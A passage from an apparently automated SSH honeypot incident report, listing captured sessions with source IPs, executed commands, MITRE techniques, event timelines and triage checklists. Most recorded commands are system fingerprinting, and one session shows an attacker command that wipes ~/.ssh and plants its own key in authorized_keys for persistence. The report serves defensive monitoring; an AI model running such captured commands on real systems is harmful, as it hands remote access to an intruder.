- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b5505b5853c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:36 |
| **Last Seen** | 2026-07-01 14:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:36:59` | `cowrie.session.connect` |
| `2026-07-01 14:36:59` | `cowrie.client.version` |
| `2026-07-01 14:36:59` | `cowrie.client.kex` |
| `2026-07-01 14:37:00` | `cowrie.login.success` |
| `2026-07-01 14:37:02` | `cowrie.session.params` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.success` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:02` | `cowrie.command.input` |
| `2026-07-01 14:37:03` | `cowrie.log.closed` |
| `2026-07-01 14:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d80e6c616e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:38 |
| **Last Seen** | 2026-07-01 14:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:38:44` | `cowrie.session.connect` |
| `2026-07-01 14:38:44` | `cowrie.client.version` |
| `2026-07-01 14:38:44` | `cowrie.client.kex` |
| `2026-07-01 14:38:46` | `cowrie.login.success` |
| `2026-07-01 14:38:47` | `cowrie.session.params` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.success` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.command.input` |
| `2026-07-01 14:38:47` | `cowrie.log.closed` |
| `2026-07-01 14:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4387b784851

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:40 |
| **Last Seen** | 2026-07-01 14:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:40:36` | `cowrie.session.connect` |
| `2026-07-01 14:40:36` | `cowrie.client.version` |
| `2026-07-01 14:40:36` | `cowrie.client.kex` |
| `2026-07-01 14:40:37` | `cowrie.login.success` |
| `2026-07-01 14:40:38` | `cowrie.session.params` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.success` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.command.input` |
| `2026-07-01 14:40:38` | `cowrie.log.closed` |
| `2026-07-01 14:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9cc57cad57

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 14:41 |
| **Last Seen** | 2026-07-01 14:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:41:43` | `cowrie.session.connect` |
| `2026-07-01 14:41:45` | `cowrie.client.version` |
| `2026-07-01 14:41:45` | `cowrie.client.kex` |
| `2026-07-01 14:41:50` | `cowrie.login.success` |
| `2026-07-01 14:41:53` | `cowrie.session.params` |
| `2026-07-01 14:41:53` | `cowrie.command.input` |
| `2026-07-01 14:41:56` | `cowrie.log.closed` |
| `2026-07-01 14:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-830a51dcd33a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:42 |
| **Last Seen** | 2026-07-01 14:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:42:32` | `cowrie.session.connect` |
| `2026-07-01 14:42:32` | `cowrie.client.version` |
| `2026-07-01 14:42:32` | `cowrie.client.kex` |
| `2026-07-01 14:42:33` | `cowrie.login.success` |
| `2026-07-01 14:42:34` | `cowrie.session.params` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.success` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.command.input` |
| `2026-07-01 14:42:34` | `cowrie.log.closed` |
| `2026-07-01 14:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bba8d4c41517

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 14:43 |
| **Last Seen** | 2026-07-01 14:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:43:39` | `cowrie.session.connect` |
| `2026-07-01 14:43:39` | `cowrie.client.version` |
| `2026-07-01 14:43:39` | `cowrie.client.kex` |
| `2026-07-01 14:43:41` | `cowrie.login.success` |
| `2026-07-01 14:43:42` | `cowrie.session.params` |
| `2026-07-01 14:43:42` | `cowrie.command.input` |
| `2026-07-01 14:43:43` | `cowrie.log.closed` |
| `2026-07-01 14:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ddd89302c9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:44 |
| **Last Seen** | 2026-07-01 14:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:44:32` | `cowrie.session.connect` |
| `2026-07-01 14:44:33` | `cowrie.client.version` |
| `2026-07-01 14:44:33` | `cowrie.client.kex` |
| `2026-07-01 14:44:33` | `cowrie.login.success` |
| `2026-07-01 14:44:34` | `cowrie.session.params` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.success` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:34` | `cowrie.command.input` |
| `2026-07-01 14:44:35` | `cowrie.log.closed` |
| `2026-07-01 14:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0a1c855f43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:46 |
| **Last Seen** | 2026-07-01 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:46:45` | `cowrie.session.connect` |
| `2026-07-01 14:46:45` | `cowrie.client.version` |
| `2026-07-01 14:46:45` | `cowrie.client.kex` |
| `2026-07-01 14:46:46` | `cowrie.login.success` |
| `2026-07-01 14:46:47` | `cowrie.session.params` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.success` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.command.input` |
| `2026-07-01 14:46:47` | `cowrie.log.closed` |
| `2026-07-01 14:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c497db0a5972

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:49 |
| **Last Seen** | 2026-07-01 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:49:12` | `cowrie.session.connect` |
| `2026-07-01 14:49:12` | `cowrie.client.version` |
| `2026-07-01 14:49:12` | `cowrie.client.kex` |
| `2026-07-01 14:49:12` | `cowrie.login.success` |
| `2026-07-01 14:49:13` | `cowrie.session.params` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.success` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.command.input` |
| `2026-07-01 14:49:13` | `cowrie.log.closed` |
| `2026-07-01 14:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f975ec8537a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:51 |
| **Last Seen** | 2026-07-01 14:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:51:50` | `cowrie.session.connect` |
| `2026-07-01 14:51:50` | `cowrie.client.version` |
| `2026-07-01 14:51:50` | `cowrie.client.kex` |
| `2026-07-01 14:51:51` | `cowrie.login.success` |
| `2026-07-01 14:51:52` | `cowrie.session.params` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.success` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.command.input` |
| `2026-07-01 14:51:52` | `cowrie.log.closed` |
| `2026-07-01 14:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9e4b573a69

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-01 14:54 |
| **Last Seen** | 2026-07-01 14:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:54:08` | `cowrie.session.connect` |
| `2026-07-01 14:54:08` | `cowrie.client.version` |
| `2026-07-01 14:54:08` | `cowrie.client.kex` |
| `2026-07-01 14:54:09` | `cowrie.login.success` |
| `2026-07-01 14:54:10` | `cowrie.session.params` |
| `2026-07-01 14:54:10` | `cowrie.command.input` |
| `2026-07-01 14:54:10` | `cowrie.command.failed` |
| `2026-07-01 14:54:11` | `cowrie.log.closed` |
| `2026-07-01 14:54:11` | `cowrie.session.params` |
| `2026-07-01 14:54:11` | `cowrie.command.input` |
| `2026-07-01 14:54:12` | `cowrie.session.file_download` |
| `2026-07-01 14:54:12` | `cowrie.log.closed` |
| `2026-07-01 14:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e44cbe6806f

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-01 14:54 |
| **Last Seen** | 2026-07-01 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:54:12` | `cowrie.session.connect` |
| `2026-07-01 14:54:12` | `cowrie.client.version` |
| `2026-07-01 14:54:12` | `cowrie.client.kex` |
| `2026-07-01 14:54:13` | `cowrie.login.success` |
| `2026-07-01 14:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1dea4b0405

| Field | Detail |
|---|---|
| **Source IP** | `168.76.131[.]178` |
| **First Seen** | 2026-07-01 14:54 |
| **Last Seen** | 2026-07-01 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:54:13` | `cowrie.session.connect` |
| `2026-07-01 14:54:13` | `cowrie.client.version` |
| `2026-07-01 14:54:14` | `cowrie.client.kex` |
| `2026-07-01 14:54:15` | `cowrie.login.success` |
| `2026-07-01 14:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.76.131[.]178` to AbuseIPDB if not already reported
- [ ] Block `168.76.131[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba497b146d7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 14:54 |
| **Last Seen** | 2026-07-01 14:54 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:54:16` | `cowrie.session.connect` |
| `2026-07-01 14:54:17` | `cowrie.client.version` |
| `2026-07-01 14:54:17` | `cowrie.client.kex` |
| `2026-07-01 14:54:24` | `cowrie.login.success` |
| `2026-07-01 14:54:27` | `cowrie.session.params` |
| `2026-07-01 14:54:27` | `cowrie.command.input` |
| `2026-07-01 14:54:29` | `cowrie.log.closed` |
| `2026-07-01 14:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e104141677

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 14:54 |
| **Last Seen** | 2026-07-01 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 14:54:54` | `cowrie.session.connect` |
| `2026-07-01 14:54:54` | `cowrie.client.version` |
| `2026-07-01 14:54:54` | `cowrie.client.kex` |
| `2026-07-01 14:54:55` | `cowrie.login.success` |
| `2026-07-01 14:54:55` | `cowrie.session.params` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.success` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:55` | `cowrie.command.input` |
| `2026-07-01 14:54:56` | `cowrie.log.closed` |
| `2026-07-01 14:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
